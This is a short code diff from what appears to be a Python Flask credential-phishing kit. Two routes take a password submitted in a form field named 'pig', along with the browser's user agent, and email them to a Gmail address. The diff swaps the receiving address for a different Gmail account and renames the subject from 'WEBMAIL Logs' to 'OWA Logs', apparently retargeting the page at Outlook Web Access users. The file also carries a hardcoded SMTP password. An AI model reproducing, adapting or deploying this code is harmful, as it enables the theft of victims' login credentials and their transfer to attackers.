@@ -147,11 +147,11 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "contact@domainshieldtech.bio"
         sender_emaill = "contact"
-        receiver_email = "fabio508ants@gmail.com"
+        receiver_email = "danielnewwoj@gmail.com"
         password = "vip5071dc7bc887"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "WEBMAIL Logs !"
+        message["Subject"] = "OWA Logs !"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -185,11 +185,11 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "contact@domainshieldtech.bio"
         sender_emaill = "contact"
-        receiver_email = "fabio508ants@gmail.com"
+        receiver_email = "danielnewwoj@gmail.com"
         password = "vip5071dc7bc887"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "WEBMAIL logs !! "
+        message["Subject"] = "OWA logs !! "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
